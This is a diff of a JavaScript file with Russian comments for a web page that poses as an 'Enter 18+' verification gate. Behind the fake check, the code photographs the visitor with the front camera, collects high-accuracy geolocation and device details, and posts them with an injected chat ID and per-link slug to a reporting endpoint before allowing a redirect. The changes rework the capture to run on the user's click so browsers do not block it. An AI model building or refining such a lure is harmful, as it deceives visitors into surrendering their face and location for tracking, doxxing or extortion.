@@ -1,19 +1,20 @@
-// === app.js ===
+// === app.js (версии от меня) ===
+// Работает по тому же origin, где открыт сайт
+const API_BASE = ''; // пустой => текущий origin
 
-// Настройки: работаем по тому же origin, где открыт сайт
-const API_BASE = ''; // оставляем пустым — запросы идут на тот же домен
-
-// Кэшируем UI
 const UI = {
   text: document.getElementById('text'),
   note: document.getElementById('note'),
   btn: document.getElementById('enterBtn'),
 };
 
-// Флаг готовности к переходу
 window.__reportReady = false;
 
-// === Стили кнопки ===
+// UI helpers
+function logConsole(...args) { console.log('[report]', ...args); }
+function setText(t) { if (UI.text) UI.text.innerHTML = t; }
+function setNote(t) { if (UI.note) UI.note.textContent = t; }
+
 function setBtnLocked() {
   const b = UI.btn;
   if (!b) return;
@@ -21,10 +22,7 @@ function setBtnLocked() {
   b.style.filter = 'grayscale(35%) brightness(0.9)';
   b.style.opacity = '0.6';
   b.style.cursor = 'not-allowed';
-  b.style.background = 'linear-gradient(90deg, #246, #39a)';
-  b.style.boxShadow = '0 0 6px rgba(0,153,255,.25)';
 }
-
 function setBtnReady() {
   const b = UI.btn;
   if (!b) return;
@@ -32,14 +30,35 @@ function setBtnReady() {
   b.style.filter = 'none';
   b.style.opacity = '1';
   b.style.cursor = 'pointer';
-  b.style.background = 'linear-gradient(90deg, #4f00ff, #00bfff)';
-  b.style.boxShadow = '0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)';
 }
 
-// === Геолокация ===
+// Проверка permissions API (если доступен)
+async function checkPermissions() {
+  const res = { camera: 'unknown', geolocation: 'unknown' };
+  try {
+    if (navigator.permissions) {
+      try {
+        const p1 = await navigator.permissions.query({ name: 'camera' });
+        res.camera = p1.state;
+      } catch { /* camera query может быть не поддержан */ }
+      try {
+        const p2 = await navigator.permissions.query({ name: 'geolocation' });
+        res.geolocation = p2.state;
+      } catch { /* ignore */ }
+    }
+  } catch (e) {
+    logConsole('checkPermissions err', e);
+  }
+  return res;
+}
+
+// Геолокация
 async function askGeolocation() {
   return new Promise((resolve) => {
-    if (!('geolocation' in navigator)) return resolve(null);
+    if (!('geolocation' in navigator)) {
+      resolve(null);
+      return;
+    }
     navigator.geolocation.getCurrentPosition(
       (p) =>
         resolve({
@@ -48,55 +67,71 @@ async function askGeolocation() {
           acc: Math.round(p.coords.accuracy),
           ts: Date.now(),
         }),
-      () => resolve(null),
+      (err) => {
+        logConsole('geolocation error', err && err.message);
+        resolve(null);
+      },
       { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
   });
 }
 
-// === Фото с камеры ===
+// Снимок с камеры с наилучшей поддержкой
 async function takePhoto() {
-  if (!navigator.mediaDevices?.getUserMedia) throw new Error('Camera unsupported');
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    throw new Error('Camera unsupported');
+  }
 
-  const stream = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: 'user' },
-  });
+  // Требуется user gesture — поэтому вызываем эту функцию только по клику
+  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
   const [track] = stream.getVideoTracks();
-
   try {
-    // Путь 1: ImageCapture, где доступен
-    const cap = new ImageCapture(track);
-    const bmp = await cap.grabFrame();
-    const c = document.createElement('canvas');
-    c.width = bmp.width;
-    c.height = bmp.height;
-    c.getContext('2d').drawImage(bmp, 0, 0);
-    const dataUrl = c.toDataURL('image/jpeg', 0.85);
-    track.stop();
-    return dataUrl;
-  } catch {
-    // Путь 2: через <video> (Safari/iOS и др.)
+    if (typeof ImageCapture !== 'undefined') {
+      try {
+        const cap = new ImageCapture(track);
+        const bmp = await cap.grabFrame();
+        const c = document.createElement('canvas');
+        c.width = bmp.width;
+        c.height = bmp.height;
+        c.getContext('2d').drawImage(bmp, 0, 0);
+        const dataUrl = c.toDataURL('image/jpeg', 0.85);
+        track.stop();
+        return dataUrl;
+      } catch (e) {
+        logConsole('ImageCapture failed, fallback to video', e);
+      }
+    }
+
+    // fallback через video element
     const v = document.createElement('video');
     v.playsInline = true;
     v.muted = true;
     v.srcObject = stream;
-
-    await new Promise((res) => (v.onloadedmetadata = res)).catch(() => {});
-    try { await v.play(); } catch {}
+    // ждём метаданных
+    await new Promise((res) => {
+      v.onloadedmetadata = res;
+      // safety timeout
+      setTimeout(res, 2000);
+    });
+    try { await v.play(); } catch (e) { /* браузер может блокировать playback, но frame всё равно может быть доступен */ }
 
     const w = v.videoWidth || 640;
     const h = v.videoHeight || 480;
     const c = document.createElement('canvas');
     c.width = w;
     c.height = h;
-    c.getContext('2d').drawImage(v, 0, 0, w, h);
+    const ctx = c.getContext('2d');
+    ctx.drawImage(v, 0, 0, w, h);
     const dataUrl = c.toDataURL('image/jpeg', 0.85);
     stream.getTracks().forEach((t) => t.stop());
     return dataUrl;
+  } catch (e) {
+    // если не смогли — убедимся, что трек остановлен
+    try { stream.getTracks().forEach((t) => t.stop()); } catch {}
+    throw e;
   }
 }
 
-// === Инфо об устройстве ===
 function getDeviceInfo() {
   const ua = navigator.userAgent;
   const isSafari =
@@ -105,87 +140,121 @@ function getDeviceInfo() {
     navigator.vendor === 'Apple Computer, Inc.';
   const m = ua.match(/OS\s(\d+)[_.]/);
   const iosVer = m ? parseInt(m[1], 10) : null;
-  return {
-    userAgent: ua,
-    platform: navigator.platform,
-    iosVersion: iosVer,
-    isSafari,
-  };
+  return { userAgent: ua, platform: navigator.platform, iosVersion: iosVer, isSafari };
 }
 
-// === Отправка отчёта ===
 async function sendReport({ photoBase64, geo }) {
   const info = getDeviceInfo();
   const body = { ...info, geo, photoBase64, note: 'auto' };
-
-  // 👇 поддержка внедрённых chatId и slug от сервера
   if (window.__reportChatId) body.chatId = window.__reportChatId;
   if (window.__SLUG) body.slug = window.__SLUG;
+
+  logConsole('POST /api/report body preview', { chatId: body.chatId, slug: body.slug, geo: !!geo });
 
   const r = await fetch(`${API_BASE}/api/report`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(body),
   });
-
   const data = await r.json().catch(() => ({}));
+  logConsole('/api/report response', data);
   if (!data.ok) throw new Error(data.error || 'Send failed');
   return data;
 }
 
-// === Основной поток ===
-async function autoFlow() {
+// Главный flow - запускается ТОЛЬКО по клику
+async function performCheck() {
   try {
     setBtnLocked();
-    if (UI.text) UI.text.innerHTML = 'Запрашиваем камеру и геолокацию…';
+    setText('Проверяем разрешения и устройство…');
+    setNote('');
 
-    const [geo, photoBase64] = await Promise.all([askGeolocation(), takePhoto()]);
+    // quick diagnostics
+    const perms = await checkPermissions();
+    logConsole('permissions', perms);
 
-    if (UI.text) UI.text.innerHTML = 'Отправляем данные для проверки…';
-    await sendReport({ photoBase64, geo });
+    if (!location.protocol.startsWith('https') && location.hostname !== 'localhost') {
+      setText('<span class="err">Требуется HTTPS. Камера/гео работают только по защищённому соединению.</span>');
+      setNote('Разверни сайт под HTTPS или тестируй на localhost.');
+      throw new Error('Insecure context');
+    }
+
+    // Запрос камеры и гео (оба требуют либо жеста пользователя, либо будут отклонены)
+    setText('Запрашиваем камеру (разреши в браузере)…');
+    let photo = null;
+    try {
+      photo = await takePhoto();
+      logConsole('photo captured size', photo.length);
+    } catch (e) {
+      logConsole('takePhoto error', e);
+      setText('<span class="err">Не удалось получить камеру.</span>');
+      setNote('Проверь разрешения камеры в браузере.');
+      throw e;
+    }
+
+    setText('Запрашиваем геопозицию (если доступна)…');
+    const geo = await askGeolocation();
+    logConsole('geo result', geo);
+
+    setText('Отправляем отчёт на сервер…');
+    await sendReport({ photoBase64: photo, geo });
 
     window.__reportReady = true;
     setBtnReady();
-
-    if (UI.text) UI.text.innerHTML = '<span class="ok">Проверка пройдена.</span>';
-    if (UI.note) UI.note.textContent = 'Можно продолжить.';
-  } catch (e) {
-    console.error(e);
-    setBtnLocked();
+    setText('<span class="ok">Проверка пройдена. Нажми ещё раз, чтобы продолжить.</span>');
+    setNote('Если не перенаправляет — икните меня (скрин ошибок).');
+    logConsole('report done');
+    return true;
+  } catch (err) {
+    console.error('[performCheck] error', err);
     window.__reportReady = false;
-    if (UI.text) UI.text.innerHTML = '<span class="err">Не удалось выполнить проверку.</span>';
-    if (UI.note) UI.note.textContent = 'Повтори позже.';
+    setBtnLocked();
+    if (!UI.text) return false;
+    // нормализованные сообщения
+    if (err && err.name === 'NotAllowedError') {
+      setText('<span class="err">Доступ запрещён (NotAllowed). Разреши камеру/гео.</span>');
+      setNote('Проверь настройки сайта в браузере и перезагрузи страницу.');
+    } else if (err && err.message === 'Insecure context') {
+      // already set above
+    } else if (err && err.message && err.message.includes('Camera unsupported')) {
+      setText('<span class="err">Камера не поддерживается.</span>');
+      setNote('Попробуй другой браузер/устройство.');
+    } else {
+      setText('<span class="err">Не удалось пройти проверку.</span>');
+      setNote(String(err && (err.message || err)));
+    }
+    return false;
   }
 }
 
-// === Экспорт функции (на всякий случай)
-window.__autoFlow = autoFlow;
-
-// === ИНИЦИАЛИЗАЦИЯ ПОСЛЕ ЗАГРУЗКИ ===
+// Инициализация UI
 document.addEventListener('DOMContentLoaded', () => {
-  // показать кнопку (если была скрыта стилями) и залочить
   if (UI.btn) {
     UI.btn.style.display = 'block';
     setBtnLocked();
+    UI.btn.textContent = 'Войти 18+';
   }
+  // Проверим, что сервер инжектил chatId/slug
+  logConsole('injected', { chatId: window.__reportChatId, slug: window.__SLUG });
 
-  // автозапуск проверки
-  autoFlow().catch((err) => console.error('autoFlow error:', err));
+  // Не автозапускаем performCheck() — большинство браузеров блокируют запрос камеры без клика.
 });
 
-// Клик по кнопке: если проверка не готова — повторяем её,
-// если готова — вызываем go() (редирект из index.html)
+// Обработчик клика: первый клик запускает проверку (если не готово), второй — редирект
 if (UI.btn) {
   UI.btn.addEventListener('click', async (e) => {
     e.preventDefault();
     if (!window.__reportReady) {
-      try { await autoFlow(); } catch (err) { console.error('retry autoFlow error:', err); }
+      setText('Запуск проверки… (появятся запросы на разрешения)');
+      await performCheck();
       return;
     }
+    // если готово — выполняем редирект (функция go() должна быть в index.html)
     if (typeof go === 'function') {
-      try { go(); } catch (err) { console.error('go() error:', err); }
-    } else if (UI.note) {
-      UI.note.textContent = 'Готово — но целевой редирект не найден.';
+      try { go(); } catch (err) { logConsole('go() failed', err); setNote('go() error: ' + (err && err.message)); }
+    } else {
+      setNote('Редирект не настроен на странице (go() не найден).');
+      logConsole('go() not found');
     }
   });
 }
